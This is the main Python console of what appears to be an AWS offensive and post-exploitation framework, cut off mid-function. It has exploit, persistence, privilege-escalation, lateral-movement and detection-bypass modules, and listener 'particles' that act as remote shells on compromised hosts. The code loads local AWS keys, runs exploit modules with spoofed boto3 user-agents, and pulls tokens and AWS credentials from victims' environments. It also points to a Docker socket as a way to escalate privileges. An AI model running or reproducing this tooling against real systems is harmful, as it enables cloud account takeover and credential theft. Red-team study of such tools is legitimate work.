#!/usr/bin/python3

import socket, errno
import boto3
import botocore.session
import sys
import banner
import os
import copy
import argparse
from termcolor import colored
import help
import textwrap
import json
import botocore
from queue import Queue
import random
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.shortcuts import CompleteStyle
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit import prompt
from prompt_toolkit.completion import NestedCompleter
from colorama import init
import re
import time
from datetime import datetime
import string
from pydoc import pipepager
import platform

from enum_user_privs import enum_privs
from getuid import getuid

path = os.getcwd() + '\\less_binary'

if platform.system() == 'Windows':
    pwsh = "powershell.exe -c '$env:Path = " + path + " + ;$env:Path'"
    os.popen(pwsh)

init()

'''
particles = [
    {
        "Name": "dnsdwwad",
        "IP":"1.1.1.1",
        "Hostname":"host",
        "LAN IP":"192.168.1.1",
        "Port":"65000",
        "OS": "Linux",
        "User": "host/glb",
        "Module":"aws_tcp"
    }
]
'''

system = platform.system()

all_sessions = []

session = {}
sess_test = {}
sockets = {}

botocoresessions = []

show = [
    'cleanup',
    'detection',
    'detectionbypass',
    'enum',
    'exploit',
    'lateralmovement',
    'listeners',
    'persistence',
    'privesc',
    'reconnaissance',
    'stager'
]

colors = [
    "not-used",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white"
]

output = ""

def list_dictionary(d, n_tab):
    global output
    if isinstance(d, list):
        n_tab += 1
        for i in d:
            if not isinstance(i, list) and not isinstance(i, dict):
                output += ("{}{}\n".format("\t" * n_tab, colored(i, colors[n_tab])))
            else:
                list_dictionary(i, n_tab)
    elif isinstance(d, dict):
        n_tab+=1
        for key, value in d.items():
            if not isinstance(value, dict) and not isinstance(value, list):
                output += ("{}{}: {}\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold']) , colored(value, colors[n_tab+1])))
            else:
                output += ("{}{}:\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold'])))
                list_dictionary(value, n_tab)

def check_env_var(environ):
    for key, value in environ.items():
        if "kube" in key or "KUBE" in key or "Kube" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to Kubernetes", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "git" in key or "GIT" in key or "Git" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to GitHub or GitLab", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "token" in key or "TOKEN" in key or "Token" in key:
            print("{} {}:{}".format(
                colored("[*] Found a Token (hopefully) on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "jenkins" in key or "JENKINS" in key or "Jenkins" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to Jenkins", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws" in key or "AWS" in key or "Aws" in key:
            print("{} {}:{}".format(
                colored("[*] Found environment variable which might point to AWS", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws_access" in key or "AWS_ACCESS" in key or "Aws_Access" in key:
            print("{} {}:{}".format(
                colored("[*] Found AWS Access Key on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws_secret" in key or "AWS_SECRET" in key or "Aws_Secret" in key:
            print("{} {}:{}".format(
                colored("[*] Found AWS Secret Key on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

        if "aws_session" in key or "AWS_SESSION" in key or "Aws_Session" in key:
            print("{} {}:{}".format(
                colored("[*] Found AWS Session Key on environment variables", "green"),
                colored(key, "red"),
                colored(value, "blue")
            )
        )

def enter_credentials(service, access_key_id, secret_key, region):
    return boto3.client(service, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key)

def enter_credentials_with_session_token(service, access_key_id, secret_key, region, session_token):
    return boto3.client(service, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key, aws_session_token=session_token)

def enter_credentials_with_session_token_and_user_agent(service, access_key_id, secret_key, region, session_token, ua):
    session_config = botocore.config.Config(user_agent=ua)
    return boto3.client(service, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key, aws_session_token=session_token, config=session_config)

def enter_credentials_with_user_agent(service, access_key_id, secret_key, region, ua):
    session_config = botocore.config.Config(user_agent=ua)
    return boto3.client(service, config=session_config, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key)

def enter_session(session_name, region, service):
    boto_session = boto3.session.Session(profile_name=session_name, region_name=region)
    return boto_session.client(service)

workspaces = []
workspace = ""
particle = ""
global shell

terminal = colored("AWS", 'yellow')
particles = {}

module_char = ""

def main(workspace, particle, terminal, p, s):
    print(
        colored("[*] Importing sessions found on ~/.aws","yellow")
    )
    botocoresessions = botocore.session.Session().available_profiles

    if len(botocoresessions) == 0:
        print(
            colored(
                "[*] No sessions found on ~/.aws",
                "green")
        )
    else:
        print(
            colored("[*] Imported sessions found on ~/.aws. Enter 'show available_sessions' to list the names, or 'show credentials' to get the credentials.", "green")
        )
        if len(all_sessions) == 0:
            for botoprofile in botocoresessions:
                botosession = botocore.session.Session(profile=botoprofile)
                ass = {}
                ass['profile'] = botoprofile
                ass['access_key_id'] = botosession.get_credentials().access_key
                ass['secret_key'] = botosession.get_credentials().secret_key
                ass['region'] = botosession.get_config_variable('region')
                if not botosession.get_credentials().token == None:
                    ass['session_token'] = botosession.get_credentials().token

                all_sessions.append(ass)

        else:
            for botoprofile in botocoresessions:
                for pr in all_sessions:
                    if pr['profile'] == botoprofile:
                        yn = input("Profile '{}' exists. Do you want to overwrite? [y/N] ")
                        if yn == 'y' or yn == 'Y':
                            botosession = botocore.session.Session(profile=botoprofile)
                            ass = {}
                            ass['profile'] = botoprofile
                            ass['access_key_id'] = botosession.get_credentials().access_key
                            ass['secret_key'] = botosession.get_credentials().secret_key
                            ass['region'] = botosession.get_config_variable('region')
                            if not botosession.get_credentials().token == None:
                                ass['session_token'] = botosession.get_credentials().token

                            all_sessions.append(ass)
                    else:
                        botosession = botocore.session.Session(profile=botoprofile)
                        ass = {}
                        ass['profile'] = botoprofile
                        ass['access_key_id'] = botosession.get_credentials().access_key
                        ass['secret_key'] = botosession.get_credentials().secret_key
                        ass['region'] = botosession.get_config_variable('region')
                        if not botosession.get_credentials().token == None:
                            ass['session_token'] = botosession.get_credentials().token

                        all_sessions.append(ass)

    global module_char

    if not module_char == "":
        #terminal = module_char
        m = (module_char.split("/")[1])[:-4]
        print(m)
        imported_module = __import__(m)

    cred_prof = ""

    sess_token = ""

    useragent = ""
    user_agents_windows = [
        'Boto3/1.7.48 Python/3.9.1 Windows/10 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.8.1 Windows/10 Botocore/1.10.48',
        'Boto3/1.7.48 Python/2.7.0 Windows/10 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.9.1 Windows/8 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.8.1 Windows/8 Botocore/1.10.48',
        'Boto3/1.7.48 Python/2.7.0 Windows/8 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.9.1 Windows/7 Botocore/1.10.48',
        'Boto3/1.7.48 Python/3.8.1 Windows/7 Botocore/1.10.48',
        'Boto3/1.7.48 Python/2.7.0 Windows/7 Botocore/1.10.48'
    ]
    user_agents_linux = [
        'Boto3/1.9.89 Python/2.7.12 Linux/4.1.2-34-generic',
        'Boto3/1.9.89 Python/3.8.1 Linux/4.1.2-34-generic',
        'Boto3/1.9.89 Python/3.9.1 Linux/5.9.0-34-generic'
    ]

    allmodules = []
    for module in show:
        arr = os.listdir("./module/" + module)
        for x in arr:
            if "__" in x:
                continue
            elif ".git" in x:
                continue
            else:
                mod = "{}/{}".format(module,x.split(".py")[0])
                allmodules.append(mod)

    comms = {
        "show":{
            "credentials": None,
            "sockets":None,
            "particles": None,
            "workspaces": None,
            "modules": None,
            "user-agent":None,
            "current-creds": None,
            "available_sessions":None,
        },
        "search":None,
        "exit":None,
        "use":{
            "credentials":{},
            "particle":{},
            "workspace": {},
            "module": WordCompleter(
                words=(allmodules),
                pattern=re.compile(r'([a-zA-Z0-9_\\/]+|[^a-zA-Z0-9_\s]+)')
                                ),
        },
        "create": {
            "workspace": None
        },
        "getuid":None,
        "insert":{
            "credentials":None
        },
        "set": {
            "credentials": None,
            "user-agent": {
                "linux":None,
                "windows":None,
                "custom":None
            }
        },
        "help":None,
        "help": {
            "workspace":None,
            "user-agent":None,
            "module":None,
            "credentials": None,
            "shell":None
        },
        "options": None,
        "back": None,
        "remove":{
            "workspace": {},
            "credentials": {},
        },
        "run": None,
        "unset": {
            "user-agent":None,
            "particle":None
        },
        "dump": {
            "credentials": None,
        },
        "import": {
            "credentials": {},
        },
        "kill":{
            "socket":{},
            "particle":{
                "all":None
            }
        },
        "shell":{
            "check_env":None,
            "exit":None
        },
        "enum_user_privs":None,
        "rename":{
            "particle":{},
            "workspace":{}
        }
    }

    if s:
        for key,value in s.items():
            comms['kill']['socket'][key] = None
        sockets.update(s)
        s.clear()

    for c in show:
        comms['show'][c] = None

    for c in all_sessions:
        comms['use']['credentials'][c['profile']] = None

    for c in all_sessions:
        comms['remove']['credentials'][c['profile']] = None

    if not os.path.isdir('./credentials/'):
        os.mkdir('./credentials/')

    arr = os.listdir("./credentials/")
    for x in arr:
        if "__" in x:
            continue
        elif ".git" in x:
            continue
        else:
            comms['import']['credentials'][x] = None

    if not os.path.isdir('./workspaces/'):
        os.mkdir('./workspaces/')

    arr = os.listdir("./workspaces/")
    for x in arr:
        if "__" in x:
            continue
        elif ".git" in x:
            continue
        else:
            workspaces.append(x)
    for x in workspaces:
        comms['remove']['workspace'][x] = None
        comms['use']['workspace'][x] = None


    completer = NestedCompleter.from_nested_dict(comms)

    com = "({})({})({}) >>> ".format(colored(workspace,"green"),colored(particle,"red"), terminal)

    try:
        history_file = FileHistory(".nebula-history-file")
        session = PromptSession(history=history_file)
        command = session.prompt(
            ANSI(
                com
            ),
            completer=completer,
            complete_style=CompleteStyle.READLINE_LIKE
        )
        command.strip()

        while (True):
            if p:
                particles.update(p)
                p.clear()

            for key, value in particles.items():
                comms['use']['particle'][key] = None
                comms['kill']['particle'][key] = None
                comms['rename']['particle'][x] = None
            
            if os.path.exists('./module/listeners/__listeners/.particles'):
                partdir = os.listdir('./module/listeners/__listeners/.particles')
                for y in partdir:
                    if not os.path.isdir(y):
                        with open("./module/listeners/__listeners/.particles/{}".format(y), 'r') as part_file:
                            particles.update(json.load(part_file))
                        part_file.close()

            if command == None or command == "":
                com = "({})({})({}) >>> ".format(colored(workspace,"green"),colored(particle,"red"), terminal)

                for x in workspaces:
                    comms['remove']['workspace'][x] = None
                completer = NestedCompleter.from_nested_dict(comms)
                history_file = FileHistory(".nebula-history-file")
                session = PromptSession(history=history_file)
                command = session.prompt(
                    ANSI(
                        com
                    ),
                    completer=completer,
                    complete_style=CompleteStyle.READLINE_LIKE
                )
                command.strip()

            elif command == 'exit':
                command = session.prompt(
                    ANSI(
                        colored("Are you sure? [y/N] ","red")
                    )
                )
                command.strip()
                if command == "Y" or command == "y":
                    if sockets:
                        for key, value in sockets.items():
                            s = value['socket']
                            s.shutdown(2)
                            s.close()

                        print("All socket closed!")
                    exit()
                    sys.exit()
                    exit()

            elif command == 'rename':
                print(colored("""[*] Usage: 
                                    If you are not using any particle, then:
                                        rename particle <current particle name> <new particle name>
                                    
                                    Else, if you are using a particle:
                                        rename particle <current particle name> <new particle name>
                                        
                              ""","red"))

            elif command.split(" ")[0] == 'rename':
                if len(command.split(" ")) < 3:
                    print(colored("""[*] Usage: 
                                        If you are not using any particle, then:
                                            rename particle <current particle name> <new particle name>

                                        Else, if you are using a particle:
                                            rename particle <current particle name> <new particle name>

                                  """, "red"))
                elif len(command.split(" ")) == 3:
                    if particle == "":
                        print(colored("""[*] Usage: 
                                            If you are not using any particle, then:
                                                rename particle <current particle name> <new particle name>

                                            Else, if you are using a particle:
                                                rename particle <current particle name> <new particle name>
                                      
                                      """, "red"))
                    else:
                        testcount = 0
                        for key,value in particles.items():
                            if key == particle:
                                key = particle
                                testcount += 1

                        if testcount == 0:
                            print(colored("[*] Particle does not exist.", "red"))

                elif len(command.split(" ")) == 4:
                    testcount = 0
                    for key, value in particles.items():
                        if key == command.split(" ")[2]:
                            key = command.split(" ")[3]
                            testcount += 1

                    if testcount == 0:
                        print(colored("[*] Particle does not exist.", "red"))

            elif command == 'enum_user_privs':
                ready = False
                if cred_prof == "":
                    print(colored("[*] Please choose a set of credentials first using 'use credentials <name>'.", "red"))
                else:
                    ready = True

                if workspace == "":
                    print(
                        colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))

                if ready:
                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            enum_privs(sess, workspace)

            elif command == 'help':
                if particle == "":
                    help.help()
                else:
                    help.help()

            elif len(command.split(" ")) > 2 and command.split(" ")[0] == 'kill':
                if command.split(" ")[1] == 'socket':
                    for key,value in sockets.items():
                        if int(command.split(" ")[2]) == key:
                            if value['type'] == 'SOCK_STREAM':
                                try:
                                    q = value['queue']
                                    #q.task_done()
                                    #q.task_done()
                                    closed = []
                                    if particles:
                                        for c,v in particles.items():
                                            if value['module'] == v['module']:
                                                conn = v['socket']
                                                conn.send('exit'.encode())
                                                conn.recv(1024)
                                                closed.append(c)

                                        for close in closed:
                                            del particles[close]

                                    s = value['socket']
                                    s.shutdown(2)
                                    s.close()
                                    value['socket'] = None
                                    print(colored("[*] Socket '{}' killed!".format(key),"green"))
                                except:
                                    e = sys.exc_info()[1]
                                    if "Invalid argument" in e:
                                        continue
                                    else:
                                        print(colored("[*] {}".format(e), "red"))

                            elif value['type'] == 'SOCK_DGRAM':
                                try:
                                    q = value['queue']
                                    # q.task_done()
                                    # q.task_done()
                                    closed = []
                                    if particles:
                                        for c, v in particles.items():
                                            if value['module'] == v['module']:
                                                conn = v['socket']
                                                conn.sendto('exit'.encode(), (v['IP'], v['Port']))
                                                conn.recvfrom(1024)
                                                closed.append(c)

                                        for close in closed:
                                            del particles[close]

                                    s = value['socket']
                                    s.shutdown(2)
                                    s.close()
                                    value['socket'] = None
                                    print(colored("[*] Socket '{}' killed!".format(key), "green"))
                                except:
                                    e = sys.exc_info()
                                    if "Invalid argument" in e:
                                        continue
                                    else:
                                        print(colored("[*] {}".format(e), "red"))

            elif len(command.split(" ")) > 1 and command.split(" ")[0] == 'help':
                help_comm = command.split(" ")[1]
                help.specific_help(help_comm)

            elif command == "create":
                print("{} {}".format(colored("[*] The exact command is:", "red"), colored("create wordspace <workspace name>", "yellow")))

            elif command.split(" ")[0] == "create":
                if command.split(" ")[1] == "workspace":
                    if len(command.split(" ")) < 3:
                        print("{} {}".format(colored("[*] The exact command is:", "red"),colored("create wordspace <workspace name>", "yellow")))

                    else:
                        if not os.path.exists("./workspaces"):
                            os.makedirs("./workspaces")

                        if not os.path.exists("./workspaces/{}".format(command.split(" ")[2])):
                            os.makedirs("./workspaces/{}".format(command.split(" ")[2]))
                            workspaces.append(command.split(" ")[2])
                            workspace = command.split(" ")[2]
                            for x in workspaces:
                                comms['remove']['workspace'][x] = None
                            completer = NestedCompleter.from_nested_dict(comms)
                            print(colored("[*] Workspace '"+(command.split(" ")[2])+"' created.","green"))
                            print(colored("[*] Current workspace set at '"+(command.split(" ")[2])+"'.", "green"))
                        else:
                            print(colored("[*] The workspace already exists. Either use it, remove it, or create a different one.", "red"))

            elif command == "search":
                print(colored("[*] Enter a pattern to search! Eg: search s3", "red"))

            elif command.split(" ")[0] == 'search':
                arr = os.listdir("./module/")
                search_dir = []
                for x in arr:
                    if "__" in x:
                        continue
                    elif ".git" in x:
                        continue
                    elif os.path.isdir("./module/{}".format(x)):
                        dir = os.listdir("./module/{}/".format(x))
                        for y in dir:
                            if not os.path.isdir(y):
                                if "__" in y:
                                    continue
                                elif ".git" in y:
                                    continue
                                else:
                                    search_dir.append(x+"/"+(y.split(".py")[0]).split(".")[0])
                    else:
                        continue
                List = []
                list2 = []
                for x in search_dir:
                    if command.split(" ")[1] in x:
                        thedir = x.split("/")[0]
                        sys.path.insert(0, "./module/" + thedir)
                        imported_module = __import__(x.split("/")[1])
                        list2.append("\t{}".format(colored(x, "blue")))
                        list2.append("\t{}".format(colored(imported_module.description, "yellow")))
                        List.append(list2)
                        list2 = []

                indention = 80
                max_line_length = 60

                for i in range(len(List)):
                    out = List[i][0].ljust(indention, ' ')
                    cur_indent = 0
                    for line in List[i][1].split('\n'):
                        for short_line in textwrap.wrap(line, max_line_length):
                            out += ' ' * cur_indent + short_line.lstrip() + "\n"
                            cur_indent = indention
                        print(out)

            elif command == 'back':
                module_char = ""
                terminal = colored("AWS",'yellow')

            elif command == 'background':
                if not particle == "":
                    particle = ""
                else:
                    print(colored("[*] You have no particles active", "red"))

            elif command == "use":
                print(colored("[*] Enter a module to use! ", "red"))

            elif command.split(" ")[0] == 'use':
                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) == 3:
                        for sess in all_sessions:
                            if sess['profile'] == command.split(" ")[2]:
                                cred_prof = command.split(" ")[2]
                                print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))

                elif command.split(" ")[1] == 'particle':
                    if not len(command.split(" ")) == 3:
                        print(colored("[*] Usage: use particle <name of particle>", "red"))
                    else:
                        par_test = 1
                        for name, par in particles.items():
                            if name == command.split(" ")[2]:
                                particle = name
                                shell = par['socket']
                                par_test = 0
                        if par_test == 1:
                            print(colored("[*] No session named: {}".format(command.split(" ")[1]), "red"))

                elif command.split(" ")[1] == "workspace":
                    for x in workspaces:
                        comms['remove']['workspace'][x] = None
                    completer = NestedCompleter.from_nested_dict(comms)
                    if len(command.split(" ")) < 3:
                        print("{} {}".format(colored("[*] The exact command is:", "red"),colored("use wordspace <workspace name>", "yellow")))

                    else:
                        if len(workspaces) == 0:
                            print(colored("[*] There are no workspaces configured", "red"))
                        else:
                            right = 0
                            for w in workspaces:
                                if w == command.split(" ")[2]:
                                    workspace = w
                                    right = 1

                            if right == 0:
                                print(colored("[*] The workstation name is wrong.", "red"))

                elif command.split(" ")[1] == 'module':
                    if not "/" in command.split(" ")[2]:
                        print(colored("[*] Exact module format is <type>/<name>. Eg: use module enum/s3_list_buckets","red"))

                    else:
                        try:
                            thedir = (command.split(" ")[2]).split("/")[0]
                            #thedir = "./" + (command.split(" ")[2]).split("/")[0]
                            sys.path.insert(0, "./module/" + thedir)
                            terminal = colored(command.split(" ")[2], "blue")
                            module_char = (command.split(" ")[2]).split("/")[1]
                            imported_module = __import__(module_char)
                            module_char = terminal
                            comms['set'] = {
                                "credentials":None
                            }
                            comms['unset'] = {}
                            for c,v in imported_module.variables.items():
                                if c == 'SERVICE':
                                    pass
                                else:
                                    comms['set'][c] = None
                                    comms['unset'][c] = None
                            completer = NestedCompleter.from_nested_dict(comms)

                        except(ModuleNotFoundError):
                            print(colored("[*] Module does not exist","red"))
                            terminal = colored("AWS",'yellow')
                            module_char = ""

            elif command.split(" ")[0] == 'remove':
                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) == 2:
                        command = input(colored("You are about to remove all credentials. Are you sure? [y/N] ","red"))
                        if command == "Y" or command == "y":
                            all_sessions.clear()
                            print(colored("[*] All credentials removed.", "yellow"))

                    elif len(command.split(" ")) == 3:
                        if command.split(" ")[2] == "" or command.split(" ")[2] == None:
                            for sess in all_sessions:
                                if sess['profile'] == "":
                                    command = input(colored("You are about to remove credential '{}'. Are you sure? [y/N] ".format(sess['profile']),"red"))
                                    if command == "Y" or command == "y":
                                        all_sessions.remove(sess)
                                        print(colored("[*] Credential '{}' removed.".format(sess['profile']), "yellow"))

                        else:
                            for sess in all_sessions:
                                if sess['profile'] == command.split(" ")[2]:
                                    command = input(colored("You are about to remove credential '{}'. Are you sure? [y/N] ".format(sess['profile']),"red"))
                                    if command == "Y" or command == "y":
                                        all_sessions.remove(sess)

                    else:
                        print(colored("[*] Set the credential profile to remove.", "red"))

                elif command.split(" ")[1] == "workspace":
                    if len(command.split(" ")) < 3:
                        print("{} {}".format(colored("[*] The exact command is:", "red"), colored("remove wordspace <workspace name>", "yellow")))

                    else:
                        if os.path.exists("./workspaces/{}".format(command.split(" ")[2])):
                            yo = input(colored("[*] Are you sure you want to delete the workspace? [y/N] ","red"))
                            if yo == 'y' or yo == 'Y':
                                os.rmdir("./workspaces/{}".format(command.split(" ")[2]))
                                workspaces.remove(command.split(" ")[2])
                        else:
                            print(colored("[*] The workstation name is wrong.", "red"))

            elif command.split(" ")[0] == 'run':
                if module_char == "":
                    print(colored("[*] Choose a module first.","red"))

                else:
                    if workspace == "":
                        history_file = FileHistory(".nebula-history-file")
                        session = PromptSession(history=history_file)
                        letters = string.ascii_lowercase
                        w = ''.join(random.choice(letters) for i in range(8))
                        command = session.prompt(
                            ANSI(
                                colored("A workspace is not configured. Workspace '" + w + "' will be created. Are you sure? [y/N] ", "red")
                            )
                        )
                        command.strip()
                        if command == "Y" or command == "y":
                            if not os.path.exists("./workspaces"):
                                os.makedirs("./workspaces")

                            if not os.path.exists("./workspaces/{}".format(command.split(" ")[2])):
                                os.makedirs("./workspaces/{}".format(command.split(" ")[2]))
                                workspaces.append(command.split(" ")[2])
                            else:
                                print(colored(
                                    "[*] The workspace already exists. Either use it, remove it, or create a different one.",
                                    "red"))

                    if not workspace == "":
                        count = 0
                        for key, value in imported_module.variables.items():
                            if value['required'] == 'true' and value['value'] == "":
                                print(colored("[*] Option '{}' is not set!".format(key), "red"))
                                count += 1

                        for sess in all_sessions:
                            if sess['profile'] == cred_prof:
                                for key,value in sess.items():
                                    if key == 'session_token':
                                        continue

                                    if value == "":
                                        print (colored("[*] Credential '{}' not set yet!".format(key),"red"))
                                        count = count + 1

                        if count == 0:
                            try:
                                service = imported_module.variables['SERVICE']['value']
                                if imported_module.needs_creds:
                                    for sess in all_sessions:
                                        if sess['profile'] == cred_prof:
                                            env_aws = {}
                                            print("access")
                                            if os.environ.get('AWS_ACCESS_KEY'):
                                                env_aws['AWS_ACCESS_KEY'] = os.environ.get('AWS_ACCESS_KEY')
                                                del os.environ['AWS_ACCESS_KEY']
                                            os.environ['AWS_ACCESS_KEY'] = sess['access_key_id']
                                            print("secret")
                                            if os.environ.get('AWS_SECRET_KEY'):
                                                env_aws['AWS_SECRET_KEY'] = os.environ.get('AWS_SECRET_KEY')
                                                del os.environ['AWS_SECRET_KEY']
                                            os.environ['AWS_SECRET_KEY'] = sess['secret_key']

                                            if 'session_token' in sess and sess['session_token'] != "":
                                                if os.environ.get('AWS_SESSION_TOKEN'):
                                                    env_aws['AWS_SESSION_TOKEN'] = os.environ.get('AWS_SESSION_TOKEN')
                                                    del os.environ['AWS_SESSION_TOKEN']
                                                os.environ['AWS_SESSION_TOKEN'] = sess['session_token']

                                            if os.environ.get('AWS_REGION'):
                                                env_aws['AWS_REGION'] = os.environ.get('AWS_REGION')
                                                del os.environ['AWS_REGION']
                                            os.environ['AWS_REGION'] = sess['region']

                                            if not 'session_token' in sess:
                                                if not useragent == "":
                                                    profile_v = enter_credentials_with_user_agent(service,
                                                                                                  sess['access_key_id'],
                                                                                                  sess['secret_key'],
                                                                                                  sess['region'],
                                                                                                  useragent
                                                                                                  )
                                                    imported_module.exploit(profile_v, workspace)

                                                else:
                                                    profile_v = enter_credentials(service,
                                                                                  sess['access_key_id'],
                                                                                  sess['secret_key'],
                                                                                  sess['region']
                                                                                  )
                                                    imported_module.exploit(profile_v, workspace)
                                            elif 'session_token' in sess and sess['session_token'] != "":
                                                if not useragent == "":
                                                    profile_v = enter_credentials_with_session_token(service,
                                                                                            sess['access_key_id'],
                                                                                            sess['secret_key'],
                                                                                            sess['region'],
                                                                                            sess['session_token']
                                                                                            )
                                                    imported_module.exploit(profile_v, workspace)
                                                else:
                                                    profile_v = enter_credentials_with_session_token_and_user_agent(service,
                                                                                                  sess['access_key_id'],
                                                                                                  sess['secret_key'],
                                                                                                  sess['region'],
                                                                                                  sess['session_token'],
                                                                                                  useragent)
                                                    imported_module.exploit(profile_v, workspace)
                                            else:
                                                print(colored("[*] Check if the session key is empty.","yellow"))
                                            del os.environ['AWS_ACCESS_KEY']
                                            del os.environ['AWS_SECRET_KEY']
                                            del os.environ['AWS_REGION']
                                            if os.environ.get('AWS_SESSION_TOKEN'):
                                                del os.environ['AWS_SESSION_TOKEN']

                                            if env_aws:
                                                os.environ['AWS_ACCESS_KEY'] = env_aws['AWS_ACCESS_KEY']
                                                os.environ['AWS_SECRET_KEY'] = env_aws['AWS_SECRET_KEY']
                                                os.environ['AWS_REGION'] = env_aws['AWS_REGION']
                                                os.environ['AWS_SESSION_TOKEN'] = env_aws['AWS_SESSION_TOKEN']
                                else:
                                    imported_module.exploit(workspace)

                            except:
                                e = sys.exc_info()
                                print(colored("[*] {}".format(e), "red"))
                                print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))

                    else:
                        print(colored(
                            "[*] Create a workstation first using 'create workspace <workstation name>'.",
                            "red"))

            elif command == 'shell':
                print(colored(
                    "[*] Enter a command to run on the remote system. Eg: 'shell <command>'", "red"))

            elif command.split(" ")[0] == "shell":
                if not particle:
                        print(colored("[*] You need to have or choose a session first. To choose a session, enter 'use particle <session name>'.", "red"))

                else:
                    try:
                        if command.split(" ")[1] == 'exit' or command.split(" ")[1] == 'quit':
                            conn = particles[particle]['socket']
                            conn.close()

                            print("{}{}{}".format(
                                colored("[*] Particle '","green"),
                                colored(particle,"blue"),
                                colored("' closed","green")
                            ))

                            del comms['use']['particle'][particle]
                            particles[particle]['socket'] = None
                            del particles[particle]
                            #del p[particle]
                            particle = ""

                        elif command.split(" ")[1] == "meta-data":
                            if len(command.split(" ")) == 2:
                                print()
                            elif len(command.split(" ")) == 3:
                                print()

                            else:
                                print(colored("Usage: shell meta-data <option>",
                                              "red"))

                        elif command.split(" ")[1] == 'check_env':
                            print(
                                colored("[*] It might take 5-6 seconds to work. Please wait! (or don't. Fuck you in each case.)", "yellow")
                            )
                            shell.send("check_env".encode())
                            check_env_dict = json.loads(shell.recv(20480).decode())

                            now = datetime.now()
                            dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
                            check_env_file = "{}_check_env".format(dt_string)

                            with open("./workspaces/{}/{}/{}".format(workspace, particle, check_env_file), "w") as particle_file:
                                json.dump(check_env_dict, particle_file, indent=4, default=str)
                            particle_file.close()

                            print(
                                "{}".format(
                                    colored("Operating System Info: ", "yellow")
                                )
                            )

                            print(
                                "\t{}{}".format(
                                    colored("Operating System: ", "yellow"),
                                    colored(check_env_dict['SYSTEM'], "yellow")
                                )
                            )

                            uname = json.loads(check_env_dict['UNAME'])

                            print(
                                "\t{}{}".format(
                                    colored("Operating System Architecture: ", "yellow"),
                                    colored(uname['arch'], "blue")
                                )
                            )

                            print(
                                "\t{}{}".format(
                                    colored("Operating System Version: ", "yellow"),
                                    colored(uname['version'], "blue")
                                )
                            )

                            print(
                                "\t{}{}".format(
                                    colored("Operating System Kernel Release: ", "yellow"),
                                    colored(uname['release'], "blue")
                                )
                            )

                            # "UNAME": "\"release\": \"5.4.72-microsoft-standard-WSL2\", \"version\": \"#1 SMP Wed Oct 28 23:40:43 UTC 2020\", \"arch\": \"x86_64\"}

                            print(
                                "\t{}{}".format(
                                    colored("Hostname: ","yellow"),
                                    colored(check_env_dict['HOSTNAME'],"blue")
                                )
                            )

                            pat = re.compile(r"[a-z0-9]{12}")
                            if re.fullmatch(pat, check_env_dict['HOSTNAME']):
                                print(
                                    colored("[*] Hostname looks like it might be a container.","green")
                                )

                            print(
                                "{}{}".format(
                                    colored("Init System: ", "yellow"),
                                    colored(check_env_dict['INIT'], "yellow")
                                )
                            )

                            if not (check_env_dict['INIT']).strip() == 'init' and not (check_env_dict['INIT']).strip() == 'systemd':
                                print(
                                    colored("[*] Process no.1 isn't init or systemd, but '{}'. Might be a container.".format(check_env_dict['INIT']), "green")
                                )

                            if check_env_dict['DOCKSOCK']:
                                print(
                                    "{}{}".format(
                                        colored("[*] Docker Socket exists. If you are on a container, you can use it to Privilege Escalate.", "green")
                                    )
                                )

                            print(
                                colored("------------------------------------------------------------------------------","yellow")
                            )

                            print(
                                "{}{}".format(
                                    colored("User: ", "yellow"),
                                    colored(check_env_dict['USER'], "yellow")
                                )
                            )

                            if check_env_dict['USER'] == 'root':
                                print(colored("[*] User is root. If you are not in a container, consider urself lucky.", "green"))

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                            print(
                                "{}:".format(
                                    colored("Environment Variables", "yellow"),
                                )
                            )

                            for key,value in (check_env_dict['ENV']).items():
                                print(
                                    "\t{}: {}".format(
                                        colored(key,"red"),
                                        colored(value,"blue")
                                    )
                                )
                            check_env_var(check_env_dict['ENV'])

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                            print(
                                colored(
                                    "AWS Credentials:",
                                    "yellow")
                            )
                            if check_env_dict['AWS_CREDS']:
                                keys = []
                                print(
                                    colored(
                                        "\t--------------------------------",
                                        "yellow")
                                )
                                for creds in check_env_dict['AWS_CREDS']:
                                    awssess = {}
                                    if creds['profile'] == 'default':
                                        awssess['profile'] = "default_{}".format(particle)
                                        keys.append("default_{}".format(particle))
                                    else:
                                        awssess['profile'] = creds['profile']
                                        keys.append(creds['profile'])
                                    awssess['access_key_id'] = creds['AWS_KEY']
                                    awssess['secret_key'] = creds['SECRET_KEY']
